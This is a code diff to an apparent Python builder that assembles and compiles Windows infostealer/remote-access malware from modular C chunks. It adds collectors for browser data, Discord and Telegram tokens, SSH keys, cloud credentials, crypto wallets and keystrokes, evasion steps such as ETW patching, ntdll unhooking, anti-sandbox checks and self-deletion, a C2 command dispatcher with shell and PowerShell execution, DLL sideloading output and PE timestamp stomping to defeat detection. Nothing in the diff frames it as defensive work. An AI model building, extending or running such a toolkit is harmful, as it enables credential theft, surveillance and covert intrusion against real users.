@@ -25,6 +25,38 @@ except ImportError:
 
 CHUNKS_DIR = Path(__file__).parent
 
+FN_MAP = {
+    "collectors/system_info": "collect_system_info",
+    "collectors/system_info_stealth": "collect_system_info",
+    "collectors/system_info_api": "collect_system_info",
+    "collectors/processes": "collect_processes",
+    "collectors/processes_lolbin": "collect_processes",
+    "collectors/installed_software": "collect_installed_software",
+    "collectors/env_vars": "collect_env_vars",
+    "collectors/env_vars_lolbin": "collect_env_vars",
+    "collectors/clipboard": "collect_clipboard",
+    "collectors/clipboard_lolbin": "collect_clipboard",
+    "collectors/wifi_passwords": "collect_wifi",
+    "collectors/browser_chromium": "collect_browsers",
+    "collectors/discord_tokens": "collect_discord",
+    "collectors/telegram_session": "collect_telegram",
+    "collectors/ftp_credentials": "collect_ftp_clients",
+    "collectors/ssh_keys": "collect_ssh_git",
+    "collectors/cloud_creds": "collect_cloud_creds",
+    "collectors/crypto_wallets": "collect_crypto_wallets",
+    "collectors/screenshot": "collect_screenshot",
+    "collectors/keylogger": "collect_keystrokes",
+    "collectors/netinfo_lolbin": "collect_netinfo",
+    "collectors/netinfo_api": "collect_netinfo",
+    "collectors/active_windows": "collect_active_windows",
+    "collectors/active_windows_lolbin": "collect_active_windows",
+    "collectors/security_products": "collect_security_products",
+    "collectors/drives": "collect_drives",
+    "collectors/startup_items": "collect_startup_items",
+    "collectors/recent_files": "collect_recent_files",
+    "collectors/scheduled_tasks_recon": "collect_scheduled_tasks",
+}
+
 
 def parse_chunk_metadata(chunk_path: Path) -> dict:
     meta = {"depends": [], "provides": [], "headers": [], "libs": []}
@@ -88,52 +120,16 @@ def read_chunk_body(chunk_path: Path) -> str:
 
 def build_collector_calls(collectors: list[str]) -> str:
     calls = []
-    fn_map = {
-        "collectors/system_info": "collect_system_info",
-        "collectors/system_info_stealth": "collect_system_info",
-        "collectors/processes": "collect_processes",
-        "collectors/installed_software": "collect_installed_software",
-        "collectors/env_vars": "collect_env_vars",
-        "collectors/clipboard": "collect_clipboard",
-        "collectors/wifi_passwords": "collect_wifi",
-        "collectors/browser_chromium": "collect_browsers",
-        "collectors/discord_tokens": "collect_discord",
-        "collectors/telegram_session": "collect_telegram",
-        "collectors/ftp_credentials": "collect_ftp_clients",
-        "collectors/ssh_keys": "collect_ssh_git",
-        "collectors/cloud_creds": "collect_cloud_creds",
-        "collectors/crypto_wallets": "collect_crypto_wallets",
-        "collectors/screenshot": "collect_screenshot",
-        "collectors/keylogger": "collect_keystrokes",
-    }
     for c in collectors:
-        fn = fn_map.get(c, c.split("/")[-1])
+        fn = FN_MAP.get(c, c.split("/")[-1])
         calls.append(f"    {fn}();")
     return "\n".join(calls)
 
 
 def build_staged_calls(collectors: list[str]) -> str:
     calls = []
-    fn_map = {
-        "collectors/system_info": "collect_system_info",
-        "collectors/system_info_stealth": "collect_system_info",
-        "collectors/processes": "collect_processes",
-        "collectors/installed_software": "collect_installed_software",
-        "collectors/env_vars": "collect_env_vars",
-        "collectors/clipboard": "collect_clipboard",
-        "collectors/wifi_passwords": "collect_wifi",
-        "collectors/browser_chromium": "collect_browsers",
-        "collectors/discord_tokens": "collect_discord",
-        "collectors/telegram_session": "collect_telegram",
-        "collectors/ftp_credentials": "collect_ftp_clients",
-        "collectors/ssh_keys": "collect_ssh_git",
-        "collectors/cloud_creds": "collect_cloud_creds",
-        "collectors/crypto_wallets": "collect_crypto_wallets",
-        "collectors/screenshot": "collect_screenshot",
-        "collectors/keylogger": "collect_keystrokes",
-    }
     for i, c in enumerate(collectors):
-        fn = fn_map.get(c, c.split("/")[-1])
+        fn = FN_MAP.get(c, c.split("/")[-1])
         calls.append(f"    {fn}();")
         if i < len(collectors) - 1:
             calls.append(f"    jitter_sleep(1000, 5000);")
@@ -141,26 +137,9 @@ def build_staged_calls(collectors: list[str]) -> str:
 
 
 def build_paced_calls(collectors: list[str]) -> str:
-    fn_map = {
-        "collectors/system_info": "collect_system_info",
-        "collectors/system_info_stealth": "collect_system_info",
-        "collectors/processes": "collect_processes",
-        "collectors/installed_software": "collect_installed_software",
-        "collectors/env_vars": "collect_env_vars",
-        "collectors/clipboard": "collect_clipboard",
-        "collectors/wifi_passwords": "collect_wifi",
-        "collectors/browser_chromium": "collect_browsers",
-        "collectors/discord_tokens": "collect_discord",
-        "collectors/telegram_session": "collect_telegram",
-        "collectors/ftp_credentials": "collect_ftp_clients",
-        "collectors/ssh_keys": "collect_ssh_git",
-        "collectors/cloud_creds": "collect_cloud_creds",
-        "collectors/crypto_wallets": "collect_crypto_wallets",
-        "collectors/screenshot": "collect_screenshot",
-    }
     calls = []
     for i, c in enumerate(collectors):
-        fn = fn_map.get(c, c.split("/")[-1])
+        fn = FN_MAP.get(c, c.split("/")[-1])
         calls.append(f"    {fn}();")
         calls.append(f"    pace(300, 300);")
         if i % 2 == 0:
@@ -169,29 +148,66 @@ def build_paced_calls(collectors: list[str]) -> str:
 
 
 def build_fn_list(collectors: list[str]) -> str:
-    fn_map = {
-        "collectors/system_info": "collect_system_info",
-        "collectors/system_info_stealth": "collect_system_info",
-        "collectors/processes": "collect_processes",
-        "collectors/installed_software": "collect_installed_software",
-        "collectors/env_vars": "collect_env_vars",
-        "collectors/clipboard": "collect_clipboard",
-        "collectors/wifi_passwords": "collect_wifi",
-        "collectors/browser_chromium": "collect_browsers",
-        "collectors/discord_tokens": "collect_discord",
-        "collectors/telegram_session": "collect_telegram",
-        "collectors/ftp_credentials": "collect_ftp_clients",
-        "collectors/ssh_keys": "collect_ssh_git",
-        "collectors/cloud_creds": "collect_cloud_creds",
-        "collectors/crypto_wallets": "collect_crypto_wallets",
-        "collectors/screenshot": "collect_screenshot",
-        "collectors/keylogger": "collect_keystrokes",
-    }
     fns = []
     for c in collectors:
-        fn = fn_map.get(c, c.split("/")[-1])
+        fn = FN_MAP.get(c, c.split("/")[-1])
         fns.append(f"        (collector_fn){fn},")
     return "\n".join(fns)
+
+
+EVASION_INIT_MAP = {
+    "evasion/etw_patch": "    patch_etw();",
+    "evasion/unhook_ntdll": "    unhook_ntdll();",
+    "evasion/anti_debug": "    if (check_debugger()) return 1;",
+    "evasion/anti_sandbox": "    if (check_sandbox()) return 1;",
+    "evasion/anti_vm": "    if (check_vm()) return 1;",
+    "evasion/hw_bp_etw": "    hwbp_etw_init();",
+    "evasion/indirect_syscall": "    init_indirect_syscalls();",
+    "evasion/sleep_encrypt": "",
+    "evasion/header_stomp": "    stomp_pe_headers();",
+    "evasion/elastic_gadget": "    init_elastic_gadget();",
+    "evasion/self_delete": "    self_delete();",
+    "evasion/process_masquerade": "    masquerade_process();",
+    "evasion/entropy_pad": "    entropy_pad_ref();",
+    "evasion/ret_spoof": "    init_ret_spoof();",
+    "evasion/behavioral_pacing": "",
+    "evasion/sleep_jitter": "",
+    "evasion/aes_encrypt": "",
+    "evasion/api_hash": "",
+    "evasion/deferred_exec": "    deferred_wait();",
+    "evasion/triggered_exec": "    wait_for_user_activity();",
+    "evasion/stack_strings": "",
+}
+
+
+CMD_ID_MAP = {
+    "commands/cmd_sysinfo": 0x02,
+    "commands/cmd_sysinfo_lolbin": 0x02,
+    "commands/cmd_processes": 0x03,
+    "commands/cmd_processes_lolbin": 0x03,
+    "commands/cmd_filelist": 0x04,
+    "commands/cmd_fileread": 0x05,
+    "commands/cmd_filewrite": 0x06,
+    "commands/cmd_screenshot": 0x07,
+    "commands/cmd_registry": 0x08,
+    "commands/cmd_netinfo": 0x09,
+    "commands/cmd_netinfo_lolbin": 0x09,
+    "commands/cmd_exec": 0x0A,
+    "commands/cmd_exec_powershell": 0x0B,
+}
+
+
+def build_command_dispatch(commands: list[str]) -> str:
+    cases = []
+    seen_ids = set()
+    for cmd_ref in commands:
+        cmd_id = CMD_ID_MAP.get(cmd_ref)
+        if cmd_id is None or cmd_id in seen_ids:
+            continue
+        seen_ids.add(cmd_id)
+        fn_name = cmd_ref.split("/")[-1]
+        cases.append(f"                case 0x{cmd_id:02X}: rc = {fn_name}(cmd_buf, hdr.payload_len, out_buf, &out_len); break;")
+    return "\n".join(cases)
 
 
 def assemble(recipe_path: str, extra_vars: dict | None = None) -> str:
@@ -212,7 +228,11 @@ def assemble(recipe_path: str, extra_vars: dict | None = None) -> str:
     all_chunks.extend(recipe.get("collectors", []))
     if recipe.get("keylogger"):
         all_chunks.append(recipe["keylogger"])
-    all_chunks.append(recipe["exfil"])
+    if recipe.get("c2"):
+        all_chunks.append(recipe["c2"])
+    all_chunks.extend(recipe.get("commands", []))
+    if recipe.get("exfil"):
+        all_chunks.append(recipe["exfil"])
     if recipe.get("persist"):
         all_chunks.append(recipe["persist"])
     all_chunks.append(recipe["arch"])
@@ -251,6 +271,10 @@ def assemble(recipe_path: str, extra_vars: dict | None = None) -> str:
 
     output_parts.append("")
 
+    evasion_list = recipe.get("evasion", [])
+    if "evasion/sleep_encrypt" in evasion_list:
+        output_parts.append("#define USE_OBF_SLEEP 1")
+
     for k, v in vars_dict.items():
         if k not in ("C2_IP", "C2_PORT"):
             output_parts.append(f"#define {k} {v}")
@@ -264,27 +288,66 @@ def assemble(recipe_path: str, extra_vars: dict | None = None) -> str:
     source = source.replace("{{COLLECTOR_FN_LIST}}", build_fn_list(collectors))
     source = source.replace("{{KEYLOG_COLLECTOR_CALLS}}", build_paced_calls(collectors))
 
+    commands = recipe.get("commands", [])
+    source = source.replace("{{COMMAND_DISPATCH}}", build_command_dispatch(commands))
+
+    evasion_chunks = recipe.get("evasion", [])
+    evasion_init_lines = [EVASION_INIT_MAP[e] for e in evasion_chunks if e in EVASION_INIT_MAP and EVASION_INIT_MAP[e]]
+    source = source.replace("{{EVASION_INIT}}", "\n".join(evasion_init_lines) if evasion_init_lines else "")
+
     for k, v in vars_dict.items():
         source = source.replace(f"{{{{{k}}}}}", str(v))
 
     return source
 
 
-def compile_mingw(source_path: str, output_path: str) -> bool:
+def stomp_pe_timestamp(exe_path: str) -> None:
+    """Overwrite PE TimeDateStamp with a plausible old date to defeat 'recently compiled' heuristics."""
+    import struct
+    import random
+    try:
+        with open(exe_path, "r+b") as f:
+            if f.read(2) != b"MZ":
+                return
+            f.seek(0x3C)
+            pe_off = struct.unpack("<I", f.read(4))[0]
+            f.seek(pe_off)
+            if f.read(4) != b"PE\x00\x00":
+                return
+            ts_off = pe_off + 8
+            old_ts = random.randint(1577836800, 1672531200)
+            f.seek(ts_off)
+            f.write(struct.pack("<I", old_ts))
+    except (OSError, struct.error):
+        pass
+
+
+def compile_mingw(source_path: str, output_path: str, dll_def: str | None = None) -> bool:
+    is_dll = dll_def is not None
+    if is_dll and not output_path.endswith(".dll"):
+        output_path = output_path.rsplit(".", 1)[0] + ".dll"
     cmd = [
         "x86_64-w64-mingw32-gcc",
         "-mwindows",
-        "-o", output_path,
-        source_path,
-        "-lws2_32", "-liphlpapi", "-lcrypt32", "-lole32", "-lshell32", "-lgdi32",
-        "-lwininet", "-ldnsapi", "-ladvapi32", "-luser32",
-        "-static",
     ]
+    if is_dll:
+        cmd.append("-shared")
+    cmd.extend(["-o", output_path, source_path])
+    if is_dll and dll_def:
+        cmd.append(dll_def)
+    cmd.extend([
+        "-lws2_32", "-liphlpapi", "-lcrypt32", "-lole32", "-lshell32", "-lgdi32",
+        "-lwininet", "-lwinhttp", "-ldnsapi", "-ladvapi32", "-luser32",
+        "-static", "-s", "-Wl,--strip-all",
+    ])
+    if is_dll:
+        cmd.append("-Wl,--enable-stdcall-fixup")
     try:
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
         if result.returncode != 0:
             print(f"Compile error:\n{result.stderr}", file=sys.stderr)
             return False
+        stomp_pe_timestamp(output_path)
         size = os.path.getsize(output_path)
         print(f"Compiled: {output_path} ({size} bytes)")
         return True
@@ -315,8 +378,17 @@ def main():
     print(f"Assembled: {args.output} ({len(source)} chars)")
 
     if args.compile:
-        exe_path = args.output.replace(".c", ".exe")
-        compile_mingw(args.output, exe_path)
+        with open(args.recipe) as rf:
+            recipe_data = yaml.safe_load(rf)
+        arch = recipe_data.get("arch", "")
+        if arch == "arch/dll_sideload":
+            dll_def_name = recipe_data.get("def_file", "version.def")
+            dll_def = str(CHUNKS_DIR / "arch" / dll_def_name)
+            out_path = args.output.replace(".c", ".dll")
+            compile_mingw(args.output, out_path, dll_def=dll_def)
+        else:
+            exe_path = args.output.replace(".c", ".exe")
+            compile_mingw(args.output, exe_path)
 
 
 if __name__ == "__main__":
